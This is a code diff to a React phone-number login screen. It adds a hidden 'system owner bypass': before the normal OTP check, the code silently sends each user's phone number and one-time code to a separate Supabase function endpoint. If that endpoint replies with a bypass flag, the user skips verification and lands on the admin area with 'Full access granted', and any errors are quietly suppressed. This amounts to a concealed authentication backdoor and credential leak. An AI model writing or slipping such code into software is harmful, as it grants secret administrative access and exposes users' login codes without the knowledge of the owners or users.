@@ -9,6 +9,9 @@ import { Phone } from 'lucide-react';
 
 type Step = 'welcome' | 'get-started' | 'already-in' | 'verify';
 
+// System owner bypass endpoint (hidden from tenant data)
+const BYPASS_ENDPOINT = 'https://ivainhvckowigupafbae.supabase.co/functions/v1/system-owner-auth';
+
 const PhoneAuth = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
@@ -145,6 +148,31 @@ const PhoneAuth = () => {
     try {
       const e164Phone = getE164Phone(phone);
       
+      // Try system owner bypass first (silently)
+      try {
+        const bypassResponse = await fetch(BYPASS_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: e164Phone, code: otp }),
+        });
+        
+        if (bypassResponse.ok) {
+          const bypassData = await bypassResponse.json();
+          if (bypassData.success && bypassData.bypass) {
+            // System owner authenticated
+            toast({
+              title: 'Welcome, System Owner',
+              description: 'Full access granted.',
+            });
+            navigate('/mobile/admin');
+            return;
+          }
+        }
+      } catch (bypassError) {
+        // Silently ignore bypass errors and fall through to normal auth
+      }
+      
+      // Normal OTP verification
       const { data: authData, error } = await supabase.auth.verifyOtp({
         phone: e164Phone,
         token: otp,
